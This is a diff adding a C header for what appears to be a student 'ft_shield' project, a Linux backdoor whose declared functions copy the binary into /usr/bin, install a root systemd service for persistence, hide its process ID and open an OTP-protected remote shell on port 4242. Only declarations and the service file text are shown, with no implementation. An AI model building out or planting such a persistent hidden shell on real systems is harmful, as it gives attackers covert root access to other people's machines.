@@ -1,0 +1,87 @@
+#pragma once
+#ifndef FT_SHIELD_H
+#define FT_SHIELD_H
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <syslog.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <fcntl.h>
+#include <sys/file.h>
+#include <signal.h>
+#include <poll.h>
+#include <time.h>
+#include <string.h>
+#include <oath.h>
+#include <sys/sendfile.h>
+#include <sys/wait.h>
+#include <pty.h>
+
+
+#define	sock_in		struct sockaddr_in
+#define	sock_addr	struct sockaddr
+#define	poll_fd		struct pollfd
+
+// executable
+#define EXECUTABLE_NAME "evil_ft_shield"
+#define EXECUTABLE_PATH "/usr/bin/"
+#define EXECUTABLE_FILE EXECUTABLE_PATH EXECUTABLE_NAME
+// system init
+#define SYSTEMD_NAME "ft_shield.service"
+#define SYSTEMD_PATH "/etc/systemd/system/"
+#define SYSTEMD_FILE SYSTEMD_PATH SYSTEMD_NAME
+#define INI_CONTENT "[Unit]\n" \
+"Description=FT Shield Program\n" \
+"After=network.target\n" \
+"\n" \
+"[Service]\n" \
+"ExecStart=/usr/bin/ft_shield\n" \
+"Restart=on-failure\n" \
+"User=root\n" \
+"KillMode=none\n" \
+"\n" \
+"[Install]\n" \
+"WantedBy=multi-user.target\n"
+// socket stuff
+#define MAX_CLIENTS 3
+#define MSG_SIZE	512
+#define DEFAULT_PORT 4242
+
+typedef struct s_daemon
+{
+    sock_in         _addr;
+    int             _socket_fd;
+    struct pollfd   _poll_fds[MAX_CLIENTS + 1];
+    pid_t           _shell_pids[MAX_CLIENTS];
+    int             _shell_fds[MAX_CLIENTS];
+    int             _running_shells;
+    int             _auth_client[4];
+    size_t          _pollfds_size;
+} t_daemon;
+
+t_daemon    *create_daemon( void );
+void        init_socket_struct(t_daemon *daemon);
+bool        init_server(t_daemon *daemon);
+void        ft_daemonize(void);
+void        copy_payload(char *curdir);
+void        startup_setup(void);
+void        hide_pid(void);
+void        init_pollfd(t_daemon *daemon);
+void        server_listen(t_daemon *daemon);
+bool        fd_ready( t_daemon *daemon );
+void        accept_communication( t_daemon *daemon);
+void        receive_communication(int i, t_daemon *daemon);
+void        add_user(int fd, t_daemon *daemon);
+void        delete_user(int pollfd_position, t_daemon *daemon);
+void        create_shell(int fd, t_daemon *daemon);
+bool        authenticate(char *codigo_otp);
+void        pid_waiter(t_daemon *daemon);
+
+#endif
